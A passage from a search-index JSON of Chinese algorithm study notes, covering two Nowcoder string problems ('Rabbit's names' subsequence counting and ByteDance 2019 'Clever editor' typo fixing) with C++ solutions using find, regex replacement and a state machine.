\uff0c\u8868\u793a\u5154\u5b50\u624b\u91cc\u7684\u53ef\u7231\u8bcd\u6c47\u3002","title":"1.5. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/4.%E7%89%9B%E5%AE%A2%E7%BD%91_NC20859_%E5%85%94%E5%AD%90%E7%9A%84%E5%90%8D%E5%AD%97/#16-output","text":"\u8f93\u51fa\u5171 n \u884c\uff0c\u6bcf\u884c\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u6bcf\u4e00\u4e2a\u540d\u5b57\u7684\u53ef\u7231\u5ea6\u3002","title":"1.6. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/4.%E7%89%9B%E5%AE%A2%E7%BD%91_NC20859_%E5%85%94%E5%AD%90%E7%9A%84%E5%90%8D%E5%AD%97/#17-sample-input","text":"5 3 Bunny Rabbit TuZi MianZi Sunny uny i a","title":"1.7. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/4.%E7%89%9B%E5%AE%A2%E7%BD%91_NC20859_%E5%85%94%E5%AD%90%E7%9A%84%E5%90%8D%E5%AD%97/#18-sample-output","text":"1 2 1 2 1","title":"1.8. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/4.%E7%89%9B%E5%AE%A2%E7%BD%91_NC20859_%E5%85%94%E5%AD%90%E7%9A%84%E5%90%8D%E5%AD%97/#19-note","text":"\u5bf9\u4e8e 40\\% \u7684\u6570\u636e 1 \\le n \\le 100 \u5bf9\u4e8e 100\\% \u7684\u6570\u636e 1 \\le n \\le 1000\uff0c1 \\le m \\le 100\uff0c1 \\le| T_i |\\le 100\uff0c1 \\le|S_i|\\le 30 |s| \u8868\u793a s \u7684\u957f\u5ea6\u8bf7\u6ce8\u610f\uff0c\u5b57\u7b26\u4e32\u533a\u5206\u5927\u5c0f\u5199\u3002","title":"1.9. Note"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/4.%E7%89%9B%E5%AE%A2%E7%BD%91_NC20859_%E5%85%94%E5%AD%90%E7%9A%84%E5%90%8D%E5%AD%97/#110-source","text":"\u725b\u5ba2\u7f51 NC20859 \u5154\u5b50\u7684\u540d\u5b57","title":"1.10. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/4.%E7%89%9B%E5%AE%A2%E7%BD%91_NC20859_%E5%85%94%E5%AD%90%E7%9A%84%E5%90%8D%E5%AD%97/#2","text":"\u6bcf\u8bfb\u5165\u4e00\u4e2a\u6a21\u5f0f\u4e32\uff0c\u904d\u5386\u6bcf\u4e2a\u4e3b\u4e32\uff0c\u5bf9\u6bcf\u4e2a\u6a21\u5f0f\u4e32\u4e2d\u7684\u5b57\u6bcd\u8fdb\u884c\u4f9d\u6b21\u5339\u914d\uff0c\u4e0b\u4e00\u6b21\u5339\u914d\u7684\u4f4d\u7f6e\u4ece\u4e0a\u4e00\u6b21\u5339\u914d\u5b8c\u7684\u4f4d\u7f6e\u5f00\u59cb\uff0c\u9632\u6b62\u91cd\u590d\u548c\u4e71\u5e8f\u3002 \u6bcf\u4e2a\u6a21\u5f0f\u4e32\u4e2d\u7684\u5b57\u6bcd\u90fd\u80fd\u5339\u914d\u4e0a\u5219\u5bf9\u5176\u53ef\u7231\u5ea6\u8fdb\u884c\u52a0\u4e00\u3002","title":"2. \u9898\u89e3"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/4.%E7%89%9B%E5%AE%A2%E7%BD%91_NC20859_%E5%85%94%E5%AD%90%E7%9A%84%E5%90%8D%E5%AD%97/#3","text":"#include <iostream> using namespace std; const int maxN = 1e3 + 1; string list[maxN], str; int ans[maxN] = { 0 }; bool multiMatch(string str, string pattern) { size_t locBuffer = 0; for (size_t i = 0; i < pattern.size(); i++) { // \u4ece\u4e0a\u4e00\u4e2a\u4f4d\u7f6e\u67e5\u627e locBuffer = str.find(pattern[i], locBuffer); // \u5982\u679c\u6ca1\u6709\u627e\u5230 if (locBuffer == str.npos) { return false; } locBuffer++; } return true; } int main() { int m, n; cin >> n >> m; for (int i = 0; i < n; i++) { cin >> list[i]; } for (int i = 0; i < m; i++) { cin >> str; for (int j = 0; j < n; j++) { // \u53ea\u8981\u4e00\u4f4d\u7279\u5f81\u4e32 if (str.size() == 1) { if (list[j].find(str) != str.npos) ans[j]++; } else { // \u591a\u4f4d if (multiMatch(list[j], str)) ans[j]++; } } } for (int i = 0; i < n; i++) { cout << ans[i] << endl; } } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/5.%E7%89%9B%E5%AE%A2%E7%BD%91_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A82019_%E8%81%AA%E6%98%8E%E7%9A%84%E7%BC%96%E8%BE%91/","text":"\u725b\u5ba2\u7f51 \u5b57\u8282\u8df3\u52a82019 \u806a\u660e\u7684\u7f16\u8f91 # \u76ee\u5f55 # \u725b\u5ba2\u7f51 \u5b57\u8282\u8df3\u52a82019 \u806a\u660e\u7684\u7f16\u8f91 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Title 1.2. Time Limit 1.3. Memory Limit 1.4. Problem Description 1.5. Input 1.6. Output 1.7. Sample Input 1.8. Sample Output 1.10. Source 2. \u9898\u89e3 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Title # \u4e07\u4e07\u6ca1\u60f3\u5230\u4e4b\u806a\u660e\u7684\u7f16\u8f91 1.2. Time Limit # C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 1.3. Memory Limit # C/C++ 32M\uff0c\u5176\u4ed6\u8bed\u8a0064M 1.4. Problem Description # \u6211\u53eb\u738b\u5927\u9524\uff0c\u662f\u4e00\u5bb6\u51fa\u7248\u793e\u7684\u7f16\u8f91\u3002\u6211\u8d1f\u8d23\u6821\u5bf9\u6295\u7a3f\u6765\u7684\u82f1\u6587\u7a3f\u4ef6\uff0c\u8fd9\u4efd\u5de5\u4f5c\u975e\u5e38\u70e6\u4eba\uff0c\u56e0\u4e3a\u6bcf\u5929\u90fd\u8981\u53bb\u4fee\u6b63\u65e0\u6570\u7684\u62fc\u5199\u9519\u8bef\u3002\u4f46\u662f\uff0c\u4f18\u79c0\u7684\u4eba\u603b\u80fd\u5728\u5e73\u51e1\u7684\u5de5\u4f5c\u4e2d\u53d1\u73b0\u771f\u7406\u3002\u6211\u53d1\u73b0\u4e00\u4e2a\u53d1\u73b0\u62fc\u5199\u9519\u8bef\u7684\u6377\u5f84\uff1a \u4e09\u4e2a\u540c\u6837\u7684\u5b57\u6bcd\u8fde\u5728\u4e00\u8d77\uff0c\u4e00\u5b9a\u662f\u62fc\u5199\u9519\u8bef\uff0c\u53bb\u6389\u4e00\u4e2a\u7684\u5c31\u597d\u5566\uff1a\u6bd4\u5982 helllo -> hello \u4e24\u5bf9\u4e00\u6837\u7684\u5b57\u6bcd\uff08AABB\u578b\uff09\u8fde\u5728\u4e00\u8d77\uff0c\u4e00\u5b9a\u662f\u62fc\u5199\u9519\u8bef\uff0c\u53bb\u6389\u7b2c\u4e8c\u5bf9\u7684\u4e00\u4e2a\u5b57\u6bcd\u5c31\u597d\u5566\uff1a\u6bd4\u5982 helloo -> hello \u4e0a\u9762\u7684\u89c4\u5219\u4f18\u5148\u201c\u4ece\u5de6\u5230\u53f3\u201d\u5339\u914d\uff0c\u5373\u5982\u679c\u662fAABBCC\uff0c\u867d\u7136AABB\u548cBBCC\u90fd\u662f\u9519\u8bef\u62fc\u5199\uff0c\u5e94\u8be5\u4f18\u5148\u8003\u8651\u4fee\u590dAABB\uff0c\u7ed3\u679c\u4e3aAABCC \u6211\u7279\u55b5\u662f\u4e2a\u5929\u624d\uff01\u6211\u5728\u84dd\u7fd4\u5b66\u8fc7\u6316\u6398\u673a\u548c\u7a0b\u5e8f\u8bbe\u8ba1\uff0c\u6309\u7167\u8fd9\u4e2a\u539f\u7406\u5199\u4e86\u4e00\u4e2a\u81ea\u52a8\u6821\u5bf9\u5668\uff0c\u5de5\u4f5c\u6548\u7387\u4ece\u6b64\u8d77\u98de\u3002\u7528\u4e0d\u4e86\u591a\u4e45\uff0c\u6211\u5c31\u4f1a\u51fa\u4efbCEO\uff0c\u5f53\u4e0a\u8463\u4e8b\u957f\uff0c\u8fce\u5a36\u767d\u5bcc\u7f8e\uff0c\u8d70\u4e0a\u4eba\u751f\u5dc5\u5cf0\uff0c\u60f3\u60f3\u90fd\u6709\u70b9\u5c0f\u6fc0\u52a8\u5462\uff01 \u4e07\u4e07\u6ca1\u60f3\u5230\uff0c\u6211\u88ab\u5f00\u9664\u4e86\uff0c\u4e34\u8d70\u65f6\u8001\u677f\u5bf9\u6211\u8bf4\uff1a \u201c\u505a\u4eba\u505a\u4e8b\u8981\u5162\u5162\u4e1a\u4e1a\u3001\u52e4\u52e4\u6073\u6073\u3001\u672c\u672c\u5206\u5206\uff0c\u4eba\u8981\u662f\u884c\uff0c\u5e72\u4e00\u884c\u884c\u4e00\u884c\u3002\u4e00\u884c\u884c\u884c\u884c\u884c\uff1b\u8981\u662f\u4e0d\u884c\uff0c\u5e72\u4e00\u884c\u4e0d\u884c\u4e00\u884c\uff0c\u4e00\u884c\u4e0d\u884c\u884c\u884c\u4e0d\u884c\u3002\u201d \u6211\u73b0\u5728\u6574\u4e2a\u4eba\u7ea2\u7ea2\u706b\u706b\u604d\u604d\u60da\u60da\u7684\u2026\u2026 \u8bf7\u542c\u9898\uff1a\u8bf7\u5b9e\u73b0\u5927\u9524\u7684\u81ea\u52a8\u6821\u5bf9\u7a0b\u5e8f 1.5. Input # \u7b2c\u4e00\u884c\u5305\u62ec\u4e00\u4e2a\u6570\u5b57N\uff0c\u8868\u793a\u672c\u6b21\u7528\u4f8b\u5305\u62ec\u591a\u5c11\u4e2a\u5f85\u6821\u9a8c\u7684\u5b57\u7b26\u4e32\u3002 \u540e\u9762\u8ddf\u968fN\u884c\uff0c\u6bcf\u884c\u4e3a\u4e00\u4e2a\u5f85\u6821\u9a8c\u7684\u5b57\u7b26\u4e32\u3002 1.6. Output # N\u884c\uff0c\u6bcf\u884c\u5305\u62ec\u4e00\u4e2a\u88ab\u4fee\u590d\u540e\u7684\u5b57\u7b26\u4e32\u3002 1.7. Sample Input # 2 helloo wooooooow 1.8. Sample Output # hello woow 1.10. Source # \u725b\u5ba2\u7f51 \u5b57\u8282\u8df3\u52a82019 \u806a\u660e\u7684\u7f16\u8f91 2. \u9898\u89e3 # \u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\u7684\u5b50\u6a21\u5f0f\u5339\u914d\u3002 regex(\"(.)\\\\1+\") \u8868\u793a\u5339\u914d\u4efb\u610f\u5b57\u7b26\u4e24\u6b21\u4ee5\u4e0a\uff0c (.) \u4ee3\u8868\u5339\u914d\u4efb\u610f\u5b57\u7b26\u7684\u4e00\u4e2a\u5b50\u6a21\u5f0f\uff0c \\\\1 \u8868\u793a\u91cd\u590d\u5b50\u6a21\u5f0f1\u4e00\u904d\uff0c + \u8868\u793a\u5339\u914d1\u5230n\u6b21\u3002 \u4f7f\u7528 regex_replace \u53ef\u4ee5\u628a\u6240\u6709 AAA \u66ff\u6362\u6210 AA \u3002 str = regex_replace(str, regex(\"(.)\\\\1+\"), \"$1$1\", regex_constants::match_default); \u540c\u6837\u4e5f\u53ef\u4ee5\u628a\u6240\u6709 AABB \u66ff\u6362\u6210 AAB \u3002 str = regex_replace(str, regex(\"(.)\\\\1(.)\\\\2\"), \"$1$1$2\", regex_constants::match_default); 3. \u4ee3\u7801 # #include <iostream> #include <regex> using namespace std; int main() { string str; // test case int n; cin >> n; // \u5bf9\u6bcf\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f while (n--) { cin >> str; // \u5339\u914daaa str = regex_replace(str, regex(\"(.)\\\\1+\"), \"$1$1\", regex_constants::match_default); // \u5339\u914daabb str = regex_replace(str, regex(\"(.)\\\\1(.)\\\\2\"), \"$1$1$2\", regex_constants::match_default); cout << str << endl; } } \u521a\u5f00\u59cb\u5199\u4e86\u4e00\u4e2a\u66f4\u590d\u6742\u7684\u7248\u672c\uff0c\u7528 regex_search \u627e\u51fa\u6240\u6709\u5339\u914d\u7684\u5b50\u4e32\u5e76\u8fdb\u884c\u66ff\u6362\u3002 \u867d\u7136 regex_search \u672c\u6765\u53ef\u4ee5\u4e00\u6b21\u627e\u51fa\u6240\u6709\u7684\u5339\u914d\u4e32\uff0c\u4f46\u662f\u8fd9\u91cc\u8981\u8003\u8651\u66ff\u6362\u7684\u4f18\u5148\u7ea7\uff0c\u6240\u4ee5\u6bcf\u66ff\u6362\u4e00\u6b21\u9700\u8981\u91cd\u65b0\u641c\u7d22\uff0c\u4e5f\u5e26\u6765\u4e86\u91cd\u590d\u7684\u5f00\u9500\u3002 #include <iostream> #include <regex> using namespace std; int main() { string str, buffer; size_t size; // test case int n; cin >> n; // \u7ed3\u675f\u7b26\u53f7 sregex_iterator end; // \u5339\u914d\u96c6\u5408 smatch m; // \u5339\u914daabb \u548c aaa string list[] = { \"(([a-z])\\\\2\\\\2)\", \"(([a-z])\\\\2([a-z])\\\\3)\" }; // \u5bf9\u6bcf\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f while (n--) { cin >> str; for (int i = 0; i < 2; i++) { while (regex_search(str, m, regex(list[i]))) { buffer = m.str(0); size = buffer.size(); // \u66ff\u6362\u5339\u914d\u9879 str = str.replace(str.find(buffer), size, buffer.substr(0, size - 1)); } } cout << str << endl; } } \u725b\u5ba2\u7f51\u4e0a\u8fd8\u6709\u4e00\u4f4d\u7528\u6237\u7684\u9898\u89e3\u4f7f\u7528\u7684\u662f\u72b6\u6001\u673a\uff0c\u770b\u7740\u4e5f\u5f88\u6e05\u6670\u3002 #include<iostream> #include<string> using namespace std; int main() { //\u81ea\u52a8\u673a int n; cin >> n; while (n--) { int state = 0;//\u521d\u59cb\u5316\u4e3a\u72b6\u60010 char cur;//\u5f53\u524d\u5b57\u7b26 string str;//\u76ee\u6807\u5b57\u7b26\u4e32 cin >> str; char last = str[0];//\u521d\u59cb\u5316\u4e3a\u7b2c\u4e00\u4e2a\u5b57\u7b26 string ans = \"\"; ans += str[0];//\u521d\u59cb\u5316 for (int i = 1; i < str.size(); ++i) {//\u5f00\u59cb cur = str[i]; switch (state) { case 0: { if (cur == last)//\u5982\u679c\u662f\u76f8\u7b49\u7684\uff0c\u8fdb\u5165\u72b6\u60011\uff0c\u5426\u5219\u7ee7\u7eed\u72b6\u60010\uff1b state = 1; //\u8fdb\u5165\u72b6\u60011\uff1aAA\u5f62\u5f0f else state = 0; //\u7ee7\u7eed\u72b6\u60010\uff1aAB\u5f62\u5f0f\uff0c\u5373\u6b63\u5e38\u5f62\u5f0f break; } case 1: { if (cur == last) continue;//AAA,\u5ffd\u7565\u5373\u53ef else state = 2;//\u8fdb\u5165\u72b6\u60013\uff1aAAB\u5f62\u5f0f break; } case 2: { if (cur == last) continue;//AABB\uff0c\u5ffd\u7565\u5373\u53ef else state = 0;//AABC\uff0c\u5c31\u662f\u72b6\u60010 break; } default: break; } ans = ans + cur; last = cur; } cout << ans << endl; } return 0; } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"5.\u725b\u5ba2\u7f51 \u5b57\u8282\u8df3\u52a82019 \u806a\u660e\u7684\u7f16\u8f91"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/5.%E7%89%9B%E5%AE%A2%E7%BD%91_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A82019_%E8%81%AA%E6%98%8E%E7%9A%84%E7%BC%96%E8%BE%91/#2019","text":"","title":"\u725b\u5ba2\u7f51 \u5b57\u8282\u8df3\u52a82019 \u806a\u660e\u7684\u7f16\u8f91"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/5.%E7%89%9B%E5%AE%A2%E7%BD%91_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A82019_%E8%81%AA%E6%98%8E%E7%9A%84%E7%BC%96%E8%BE%91/#_1","text":"\u725b\u5ba2\u7f51 \u5b57\u8282\u8df3\u52a82019 \u806a\u660e\u7684\u7f16\u8f91 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Title 1.2. Time Limit 1.3. Memory Limit 1.4. Problem Description 1.5. Input 1.6. Output 1.7. Sample Input 1.8. Sample Output 1.10. Source 2. \u9898\u89e3 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/5.%E7%89%9B%E5%AE%A2%E7%BD%91_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A82019_%E8%81%AA%E6%98%8E%E7%9A%84%E7%BC%96%E8%BE%91/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/5.%E7%89%9B%E5%AE%A2%E7%BD%91_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A82019_%E8%81%AA%E6%98%8E%E7%9A%84%E7%BC%96%E8%BE%91/#11-title","text":"\u4e07\u4e07\u6ca1\u60f3\u5230\u4e4b\u806a\u660e\u7684\u7f16\u8f91","title":"1.1. Title"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/5.%E7%89%9B%E5%AE%A2%E7%BD%91_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A82019_%E8%81%AA%E6%98%8E%E7%9A%84%E7%BC%96%E8%BE%91/#12-time-limit","text":"C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2","title":"1.2. Time Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/5.%E7%89%9B%E5%AE%A2%E7%BD%91_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A82019_%E8%81%AA%E6%98%8E%E7%9A%84%E7%BC%96%E8%BE%91/#13-memory-limit","text":"C/C++ 32M\uff0c\u5176\u4ed6\u8bed\u8a0064M","title":"1.3. Memory Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/5.%E7%89%9B%E5%AE%A2%E7%BD%91_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A82019_%E8%81%AA%E6%98%8E%E7%9A%84%E7%BC%96%E8%BE%91/#14-problem-description","text":"\u6211\u53eb\u738b\u5927\u9524\uff0c\u662f\u4e00\u5bb6\u51fa\u7248\u793e\u7684\u7f16\u8f91\u3002\u6211\u8d1f\u8d23\u6821\u5bf9\u6295\u7a3f\u6765\u7684\u82f1\u6587\u7a3f\u4ef6\uff0c\u8fd9\u4efd\u5de5\u4f5c\u975e\u5e38\u70e6\u4eba\uff0c\u56e0\u4e3a\u6bcf\u5929\u90fd\u8981\u53bb\u4fee\u6b63\u65e0\u6570\u7684\u62fc\u5199\u9519\u8bef\u3002\u4f46\u662f\uff0c\u4f18\u79c0\u7684\u4eba\u603b\u80fd\u5728\u5e73\u51e1\u7684\u5de5\u4f5c\u4e2d\u53d1\u73b0\u771f\u7406\u3002\u6211\u53d1\u73b0\u4e00\u4e2a\u53d1\u73b0\u62fc\u5199\u9519\u8bef\u7684\u6377\u5f84\uff1a \u4e09\u4e2a\u540c\u6837\u7684\u5b57\u6bcd\u8fde\u5728\u4e00\u8d77\uff0c\u4e00\u5b9a\u662f\u62fc\u5199\u9519\u8bef\uff0c\u53bb\u6389\u4e00\u4e2a\u7684\u5c31\u597d\u5566\uff1a\u6bd4\u5982 helllo -> hello \u4e24\u5bf9\u4e00\u6837\u7684\u5b57\u6bcd\uff08AABB\u578b\uff09\u8fde\u5728\u4e00\u8d77\uff0c\u4e00\u5b9a\u662f\u62fc\u5199\u9519\u8bef\uff0c\u53bb\u6389\u7b2c\u4e8c\u5bf9\u7684\u4e00\u4e2a\u5b57\u6bcd\u5c31\u597d\u5566\uff1a\u6bd4\u5982 helloo -> hello \u4e0a\u9762\u7684\u89c4\u5219\u4f18\u5148\u201c\u4ece\u5de6\u5230\u53f3\u201d\u5339\u914d\uff0c\u5373\u5982\u679c\u662fAABBCC\uff0c\u867d\u7136AABB\u548cBBCC\u90fd\u662f\u9519\u8bef\u62fc\u5199\uff0c\u5e94\u8be5\u4f18\u5148\u8003\u8651\u4fee\u590dAABB\uff0c\u7ed3\u679c\u4e3aAABCC \u6211\u7279\u55b5\u662f\u4e2a\u5929\u624d\uff01\u6211\u5728\u84dd\u7fd4\u5b66\u8fc7\u6316\u6398\u673a\u548c\u7a0b\u5e8f\u8bbe\u8ba1\uff0c\u6309\u7167\u8fd9\u4e2a\u539f\u7406\u5199\u4e86\u4e00\u4e2a\u81ea\u52a8\u6821\u5bf9\u5668\uff0c\u5de5\u4f5c\u6548\u7387\u4ece\u6b64\u8d77\u98de\u3002\u7528\u4e0d\u4e86\u591a\u4e45\uff0c\u6211\u5c31\u4f1a\u51fa\u4efbCEO\uff0c\u5f53\u4e0a\u8463\u4e8b\u957f\uff0c\u8fce\u5a36\u767d\u5bcc\u7f8e\uff0c\u8d70\u4e0a\u4eba\u751f\u5dc5\u5cf0\uff0c\u60f3\u60f3\u90fd\u6709\u70b9\u5c0f\u6fc0\u52a8\u5462\uff01 \u4e07\u4e07\u6ca1\u60f3\u5230\uff0c\u6211\u88ab\u5f00\u9664\u4e86\uff0c\u4e34\u8d70\u65f6\u8001\u677f\u5bf9\u6211\u8bf4\uff1a \u201c\u505a\u4eba\u505a\u4e8b\u8981\u5162\u5162\u4e1a\u4e1a\u3001\u52e4\u52e4\u6073\u6073\u3001\u672c\u672c\u5206\u5206\uff0c\u4eba\u8981\u662f\u884c\uff0c\u5e72\u4e00\u884c\u884c\u4e00\u884c\u3002\u4e00\u884c\u884c\u884c\u884c\u884c\uff1b\u8981\u662f\u4e0d\u884c\uff0c\u5e72\u4e00\u884c\u4e0d\u884c\u4e00\u884c\uff0c\u4e00\u884c\u4e0d\u884c\u884c\u884c\u4e0d\u884c\u3002\u201d \u6211\u73b0\u5728\u6574\u4e2a\u4eba\u7ea2\u7ea2\u706b\u706b\u604d\u604d\u60da\u60da\u7684\u2026\u2026 \u8bf7\u542c\u9898\uff1a\u8bf7\u5b9e\u73b0\u5927\u9524\u7684\u81ea\u52a8\u6821\u5bf9\u7a0b\u5e8f","title":"1.4. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/5.%E7%89%9B%E5%AE%A2%E7%BD%91_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A82019_%E8%81%AA%E6%98%8E%E7%9A%84%E7%BC%96%E8%BE%91/#15-input","text":"\u7b2c\u4e00\u884c\u5305\u62ec\u4e00\u4e2a\u6570\u5b57N\uff0c\u8868\u793a\u672c\u6b21\u7528\u4f8b\u5305\u62ec\u591a\u5c11\u4e2a\u5f85\u6821\u9a8c\u7684\u5b57\u7b26\u4e32\u3002 \u540e\u9762\u8ddf\u968fN\u884c\uff0c\u6bcf\u884c\u4e3a\u4e00\u4e2a\u5f85\u6821\u9a8c\u7684\u5b57\u7b26\u4e32\u3002","title":"1.5. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/5.%E7%89%9B%E5%AE%A2%E7%BD%91_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A82019_%E8%81%AA%E6%98%8E%E7%9A%84%E7%BC%96%E8%BE%91/#16-output","text":"N\u884c\uff0c\u6bcf\u884c\u5305\u62ec\u4e00\u4e2a\u88ab\u4fee\u590d\u540e\u7684\u5b57\u7b26\u4e32\u3002","title":"1.6. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/5.%E7%89%9B%E5%AE%A2%E7%BD%91_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A82019_%E8%81%AA%E6%98%8E%E7%9A%84%E7%BC%96%E8%BE%91/#17-sample-input","text":"2 helloo wooooooow","title":"1.7. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/5.%E7%89%9B%E5%AE%A2%E7%BD%91_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A82019_%E8%81%AA%E6%98%8E%E7%9A%84%E7%BC%96%E8%BE%91/#18-sample-output","text":"hello woow","title":"1.8. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/5.%E7%89%9B%E5%AE%A2%E7%BD%91_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A82019_%E8%81%AA%E6%98%8E%E7%9A%84%E7%BC%96%E8%BE%91/#110-source","text":"\u725b\u5ba2\u7f51 \u5b57\u8282\u8df3\u52a82019 \u806a\u660e\u7684\u7f16\u8f91","title":"1.10. 